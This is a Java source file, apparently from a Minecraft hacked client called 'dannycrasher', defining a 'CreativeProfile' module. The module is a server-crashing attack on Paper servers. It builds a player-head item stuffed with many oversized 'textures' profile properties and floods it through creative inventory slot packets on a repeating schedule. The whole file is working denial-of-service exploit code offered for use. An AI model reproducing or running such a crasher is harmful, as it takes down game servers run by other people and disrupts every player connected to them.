package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataProfile;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeProfile extends Module {
	private ScheduledExecutorService executorService;

	public CreativeProfile() {
		super("CreativeProfile", "Paper creative-slot player head profile bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("propCount", ArgumentType.INT, 1, 4096, "32");
		addArgument("propLength", ArgumentType.INT, 1, 2096000, "4096");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int propCount = context.getInt("propCount");
		int propLength = context.getInt("propLength");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		String value = "A".repeat(propLength);
		List<DataProfile.Property> properties = new ArrayList<>(propCount);
		for (int i = 0; i < propCount; i++) {
			properties.add(new DataProfile.Property("textures", value));
		}

		DataComponents components = new DataComponents();
		components.put(new DataProfile("DannyBomb", UUID.nameUUIDFromBytes("dannycrasher".getBytes()), properties));
		ItemStack item = new ItemStack(ItemType.PLAYER_HEAD.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
